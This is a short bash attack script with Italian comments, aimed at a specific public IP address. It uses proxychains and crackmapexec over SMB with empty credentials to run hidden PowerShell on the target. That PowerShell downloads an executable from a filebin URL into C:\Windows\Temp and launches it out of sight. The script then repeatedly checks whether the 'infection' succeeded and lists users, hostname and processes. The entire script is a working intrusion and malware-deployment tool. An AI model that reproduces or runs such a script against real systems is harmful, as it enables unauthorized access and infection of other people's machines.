#!/bin/bash
TARGET="186.57.237.126"
EDGEONE_URL="https://filebin.net/IL_TUO_HASH"  # ← CAMBIA QUI!

# Deploy + Log
proxychains4 crackmapexec smb $TARGET -u '' -p '' --exec-method atexec -x "
powershell -nop -w hidden -c '
\$wc=New-Object Net.WebClient;
\$wc.Headers.Add(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64)\");
\$wc.DownloadFile(\"$EDGEONE_URL\", \"C:\\Windows\\Temp\\trustedf57.exe\");
Start-Process \"C:\\Windows\\Temp\\trustedf57.exe\" -WindowStyle Hidden;
\"DEPLOYED OK \$((Get-Date))\" | Out-File C:\\Windows\\Temp\\deploy.log -Encoding ascii
'
"

# Monitor migliorato (processi + file + log)
for i in {1..30}; do  # 30x invece 60x (2.5min)
  echo "[$i/30] 🔍 Infection check..."
  OUTPUT=$(proxychains4 crackmapexec smb $TARGET -u '' -p '' --exec-method atexec -x "
    if(Test-Path 'C:\\Windows\\Temp\\trustedf57.exe'){ '✅ FILE EXISTS' } else { '❌ NO FILE' };
    Get-Process | ?{\$_.ProcessName -like '*trusted*'} | select Name,ID,StartTime;
    Get-Content C:\\Windows\\Temp\\deploy.log -ErrorAction SilentlyContinue;
    hostname; whoami
  " 2>/dev/null)
  
  echo "$OUTPUT"
  [[ $OUTPUT == *"✅ FILE EXISTS"* || $OUTPUT == *"trusted"* ]] && echo "🎉 INFECTED!" && break
  sleep 5
done

echo "🏁 FINAL STATUS:"
proxychains4 crackmapexec smb $TARGET -u '' -p '' --exec-method atexec -x "
net user; hostname; 
Get-Process | ?{\$_.ProcessName -match 'trustedf57|TRUSTED'};
dir C:\\Windows\\Temp\\trustedf57.exe; 
Get-Content C:\\Windows\\Temp\\deploy.log
"
